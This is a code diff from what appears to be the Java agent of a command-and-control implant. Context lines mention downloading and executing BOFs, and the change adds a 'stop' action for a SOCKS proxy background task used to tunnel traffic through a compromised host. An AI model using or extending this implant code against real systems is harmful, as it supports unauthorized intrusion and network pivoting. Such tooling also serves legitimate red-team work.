@@ -394,7 +394,36 @@ public class Agent {
                 // Return initial response
                 return commHandler.createTaskResult(taskId, "Downloading and executing BOF: " + bofName + "\n");
             } else if ("socks".equals(command)) {
-                // SOCKS proxy - start background task
+                // SOCKS proxy - check if this is start or stop
+                com.fasterxml.jackson.databind.JsonNode paramsNode = mapper.readTree(parameters);
+                String action = paramsNode.has("action") ? paramsNode.get("action").asText() : "start";
+                
+                if ("stop".equals(action)) {
+                    // Find the existing SOCKS background task and send it a stop message
+                    Config.debugLog(config, "SOCKS stop requested, finding existing task");
+                    BackgroundTask existingTask = null;
+                    for (BackgroundTask bgTask : backgroundTasks.values()) {
+                        if ("socks".equals(bgTask.getCommand()) && bgTask.running) {
+                            existingTask = bgTask;
+                            break;
+                        }
+                    }
+                    
+                    if (existingTask != null) {
+                        Config.debugLog(config, "Found existing SOCKS task, sending stop action");
+                        // Send stop action to the background task
+                        com.fasterxml.jackson.databind.node.ObjectNode stopMsg = mapper.createObjectNode();
+                        stopMsg.put("action", "stop");
+                        existingTask.getToTaskQueue().offer(stopMsg);
+                        
+                        return commHandler.createTaskResult(taskId, "SOCKS proxy stop requested");
+                    } else {
+                        Config.debugLog(config, "No running SOCKS task found");
+                        return commHandler.createTaskError(taskId, "No running SOCKS proxy found");
+                    }
+                }
+                
+                // Start action - create new background task
                 Config.debugLog(config, "Starting SOCKS background task");
                 // Create the background task (don't execute SocksTask)
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
